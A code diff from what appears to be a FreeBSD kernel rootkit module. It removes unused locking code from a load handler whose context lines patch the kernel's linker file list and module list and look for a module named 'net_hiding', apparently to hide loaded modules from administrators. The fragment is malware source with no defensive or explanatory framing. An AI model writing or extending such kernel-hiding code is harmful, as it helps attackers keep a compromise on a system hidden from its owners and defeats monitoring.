@@ -21,7 +21,6 @@ static void print_status(void);
 
 typedef TAILQ_HEAD(, module) modulelist_t;
 
-extern struct lock lock_t;
 extern linker_file_list_t linker_files;	/* patch the linker_files list */
 extern int next_file_id;
 extern modulelist_t modules;		/* patch the module list */
@@ -67,15 +66,11 @@ static int event_handler(struct module *module, int event, void *arg) {
 	int e = 0; /* Error, 0 for normal return status */
 	linker_file_t lf = 0;
 	module_t mod = 0;
-	struct mtx m;
-	mtx_init(&m, "kernel_mutex", NULL, MTX_DEF);
 
 	switch (event) {
 		case MOD_LOAD:
 			uprintf("The module has been loaded!\n");
 			
-			/* lockmgr(&lock_t, LK_SHARED, &m); */
-	
 			/* NOTE: The first linker file is the current kernel image (/kernel for example).
 			   		 If we load our module we will increase the reference count of the kernel
 					 link file. This might be a but suspect, so we must patch this. */
@@ -96,8 +91,6 @@ static int event_handler(struct module *module, int event, void *arg) {
 					break;
 				}
 			}
-
-			/* lockmgr(&lock_t, LK_RELEASE, &m); */
 
 			for (mod = TAILQ_FIRST(&modules); mod; mod = TAILQ_NEXT(mod, link)) {
 				if (!strcmp(mod->name, "net_hiding")) {
